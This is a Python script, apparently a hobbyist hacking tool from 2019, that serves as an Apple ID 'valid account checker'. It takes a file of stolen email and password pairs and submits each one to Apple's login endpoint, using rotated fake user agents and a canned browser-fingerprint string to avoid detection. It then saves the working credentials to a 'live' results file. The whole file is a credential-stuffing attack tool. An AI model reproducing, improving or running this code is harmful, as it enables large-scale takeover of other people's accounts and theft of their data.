# -*- coding: utf-8 -*-
# CODED BY DSWEB19778
# 2019
# CONTACT TO : fb.com/name.path
# Github/DsWeb19778
# CHECK LIBRARY
def main():
 try:
  import requests as p
  import datetime as dt
  import platform as ps
  import random as h
  import colorama as c
  import sys
  #import Queue
  import threading
  from colorama import init
  from termcolor import colored as pazzo
  from fake_useragent import UserAgent
  import os
  import time
  from os import path as y
 except ImportError:
  print("[*] U need To install library ") 
  print("[*] requests,colorama,fake_useragent")
 # SET COLOR :
 red = c.Fore.LIGHTRED_EX
 green = c.Fore.LIGHTGREEN_EX
 yellow = c.Fore.LIGHTYELLOW_EX
 genta = c.Fore.LIGHTMAGENTA_EX
 blue = c.Fore.LIGHTBLUE_EX
 yell = c.Fore.YELLOW
 init()
 giv_p = ps.system()
 if(giv_p == "Windows"):
  os.system("cls")
  color_green = "a"
  color_red = "c"
  color_kaki = "6"
  os.system("color "+str(color_kaki))
 else:
  os.system("clear")
 ############ LOGO FOR COPYRIGHT ############# PLZ DONT REMOVE THIS LOGO
 def slowprint(s):
   for c in s + '\n':
     sys.stdout.write(c)
     sys.stdout.flush()
     time.sleep(1./60)
 clear = "\x1b[0m"
 colors = [36,30]
 xloogo = (""" 
	╔┓┏╦━━╦┓╔┓╔━━╗
	║┗┛║┗━╣┃║┃║00║
	║┏┓║┏━╣┗╣┗╣╰╯║
	╚┛┗╩━━╩━╩━╩━━
    DDDDDDDDDD  SSSSSSSSSS
    DD      DD  SS      SS
    DD      DD          SS
    DD      DD  SSSSSSSSSS
    DD      DD  SS        
    DD      DD  SS      SS     
    DDDDDDDDDD  SSSSSSSSSS
 """)
 for N, line in enumerate(xloogo.split("\n")):
            sys.stdout.write("\x1b[1;%dm%s%s\n" % (h.choice(colors), line, clear))
            time.sleep(0.05)
 print(yell) 
 slowprint(" WEB19778 > Accurate 100%")
 slowprint(pazzo(" NOTE : ACCOUNT TXT FILE NEED TO BE USERNAME[SPLIT]PASSWORD\n","red"))
 print("[+] Coded By DsWeb19778 >> 2019 [REALYEAR]")
 print("[+] CopyRight | >> facebook.com/name.path")
 print("[+] APPLE VALID ACCOUNT CHECKER ...")
 def mydate(): # FUnction FOr DATE
     year = dt.datetime.now().year
     month = dt.datetime.now().month
     day = dt.datetime.now().day
     print("[+] Scan at "+str(year)+"/"+str(month)+"/"+str(day)) 
 mydate()
 # hahah Mailist
 my_file = input("\n>> FILE ACCOUNTS [EMAIL[SPLIT]PASSWORD] >>>> ")
 my_split = input(">> YOUR EMAIL AND PASS SPLIT >>>> ")
 print(">> RZLT FILE...")
 time.sleep(3)
 # Create File RZT
 if(y.isdir("rzlt")):
  print("[+] Dir Exist.")
 else:
  os.mkdir("rzlt")
  print("[+] File Created.")
 print("[+] Start Scaning ... \n")
 ########### DATA POST ############
 url = "https://idmsa.apple.com/authenticate" # URL EXPLOITED 
 Env = "PROD"
 accNameLocked = "false"
 appIdKey = "f63dc42a63424f0876a5d56bcc1f3e8952e0b9c3ecef205d4f46bd99dc33c615"
 def agent():
  useragent = ['Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5362 (KHTML, like Gecko) Chrome/14.0.848.0 Safari/5362','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)','Opera/8.77 (Windows NT 6.0; U; en-US) Presto/2.9.179 Version/10.00','Mozilla/5.0 (Windows NT 5.1; en-US; rv:1.9.0.20) Gecko/20130614 Firefox/3.6.8','Mozilla/5.0 (Windows NT 6.0; en-US; rv:1.9.0.20) Gecko/20141216 Firefox/7.0','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/5.1)','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/5.1)','Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.1)','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5350 (KHTML, like Gecko) Chrome/15.0.827.0 Safari/5350','Mozilla/5.0 (Windows NT 5.0; en-US; rv:1.9.2.20) Gecko/20110914 Firefox/5.0.1','Mozilla/5.0 (Windows NT 6.0) AppleWebKit/5311 (KHTML, like Gecko) Chrome/13.0.808.0 Safari/5311','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.1)','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5352 (KHTML, like Gecko) Chrome/15.0.874.0 Safari/5352','Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/3.0)','Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0)','Mozilla/5.0 (Windows NT 5.1) AppleWebKit/5361 (KHTML, like Gecko) Chrome/13.0.833.0 Safari/5361','Mozilla/5.0 (Windows NT 6.1; en-US; rv:1.9.0.20) Gecko/20120410 Firefox/3.8',"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36"]
  rad = h.choice(useragent)
  return rad
 list_lang = [
  "FR-FR",
  "EN-EN",
  "IT-IT"
  ] # RAND LANG 
 random_lang = h.choice(list_lang) 
 clientInfo = {"U":agent(),"L":"fr-FR","Z":"GMT+01:00","V":"1.1","F":"Fta44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVgszl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90OkxjPm8LKfAaZ4pAJZ7OQuyPBB2SCXw2SCVL6yXyjaY1WMsiZRPrwVL6tqAhbrmQkLRUs_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuKKjC74.gsTrhO3f9p_nH1wzQk1hCUMnGWqbPaRgwe98vDdYejftckuyPBDjaY2ftckkCoq1HACVdYFeI1bgJ6LLtQkmbFVDJhCult2uXjodUW2Reif6KPBSpHrk.Nk4JkJlo9Y_3Drf6ZE_JzH_yJhp0iKMKXJ2237lY5BSmxGY5BOgkLT0XxU..BWP"}
 fdcBrowserData = {"U":agent(),"L":"fr-FR","Z":"GMT+01:00","V":"1.1","F":"Fta44j1e3NlY5BSo9z4ofjb75PaK4Vpjt.gEngMQEjZrVgszl998tp7ppfAaZ6m1CdC5MQjGejuTDRNziCvTDfWoefTPF90OkxjPm8LKfAaZ4pAJZ7OQuyPBB2SCXw2SCVL6yXyjaY1WMsiZRPrwVL6tqAhbrmQkLRUs_43wuZPup_nH2t05oaYAhrcpMxE6DBUr5xj6KkuKKjC74.gsTrhO3f9p_nH1wzQk1hCUMnGWqbPaRgwe98vDdYejftckuyPBDjaY2ftckkCoq1HACVdYFeI1bgJ0VMAT5Ju30m_djLE7UJKy_Aw7Q_KpNufGYiOKw.5B0KB4BS1ctG2hult2tKEodU_ASFQ_KpN_.kl1BNlY6RjJNlY5QB4bVNjMk.BsA"}
 language = random_lang
 openiForgotInNewWindow = "false"
 referer = "https://idmsa.apple.com/login.html?appIdKey=f63dc42a63424f0876a5d56bcc1f3e8952e0b9c3ecef205d4f46bd99dc33c615"
 requestUri = "/authenticate"
 scnt = "c4f3acb575d39ae95670d408c6e401e1"
 ############### SCAN AND CATCH ERROR ###################
 def starts():
  try :
   mod = "r+"
   open_me = open(my_file,mod)
   read_me = open_me.readlines()
   get_listcount = len(read_me) 
   ## COUNT LIST ##
   print(green+"[+] YOU HAVE >> "+str(get_listcount)+" ACCOUNT\n")
   for account in read_me:
      
    ### CONNECT AND READ CONTENT
    striped = account.strip()
    get_account = striped.split(my_split)
    my_email = get_account[0]
    my_pass = get_account[1]
    post_data = {"Env":Env,"accNameLocked":accNameLocked,"accountPassword":my_pass,"appIdKey":appIdKey,"appleId":my_email,"clientInfo":clientInfo,"fdcBrowserData":fdcBrowserData,"language":language,"openiForgotInNewWindow":openiForgotInNewWindow,"referer":referer,"requestUri":requestUri,"scnt":scnt}
    my_fake_s = UserAgent() # GEN FAKE AGENT 
    headers = {'User-Agent': my_fake_s.chrome}
    connect = p.post(url,params=post_data,headers=headers,timeout=None).content
    
    # Condition for multi lang msg
    if ("FR-FR" in language):
     die = "Votre identifiant Apple ou votre mot de passe n’a pas été saisi correctement.".encode()
     live = "SDL WorldServer 11.3.0.4589 - Login".encode()
    elif("EN-EN" in language):
     die = "Your Apple ID or password was entered incorrectly.".encode()
     live = "SDL WorldServer 11.3.0.4589 - Login".encode()

    elif("IT-IT"):
     die= "L’ID Apple o la password non sono corretti.".encode()
     live = "SDL WorldServer 11.3.0.4589 - Login".encode()
    # ADD FULL TIME
    time_full = "- " + blue + time.ctime() + " "
    #limited = "Cet identifiant Apple a été verrouillé pour des raisons de sécurité."
    if(die in connect):
        # save invalid account
        print(time_full+red+"[-] DIE ACCOUNT >>> "+my_email+" | "+my_pass+"")
        save_invalid = open("rzlt/die.txt","a+")
        save_invalid.write("DIE : "+my_email+" | "+my_pass+"\n")
        
    elif(live in connect):
     # save valid
        print(time_full+green+"[+] LIVE ACCOUNT >> "+my_email+" | "+my_pass+"")
        save_valid = open("rzlt/live.txt","a+")
        save_valid.write("LIVE : "+my_email+" | "+my_pass+"\n")
        
    #elif(limited in connect):
    #    save limited
    #    print("[!] LIMITED ACCOUNT >> "+my_email+" | "+my_pass+"")
    #    save_lim = open("rzlt/limited.txt","a+")
    #    save_lim.write("LIMITED : "+my_email+" | "+my_pass+"\n")     
        
    else:
        print(time_full+yellow+"[!] LIMITED ACCOUNT >>> "+my_email+" | "+my_pass+"")
        save_lim = open("rzlt/limited.txt","a+")
        save_lim.write("LIMITED : "+my_email+" | "+my_pass+"\n")

  except IOError as myerr:
   print("[-][-__-] Connection Problem or File Errors >> "+str(myerr))
   exit()
  except ValueError as k:
   print("[-][-__-] Split ERROR  >> "+str(k))
   exit()
  print(genta+"[Finnaly] END u will find  /rzlt/live.txt or die.txt or limited.txt ")
 #starts()
 t = threading.Thread(target=starts())
 t.start() 
  #exit()
if __name__ == '__main__':
 main()
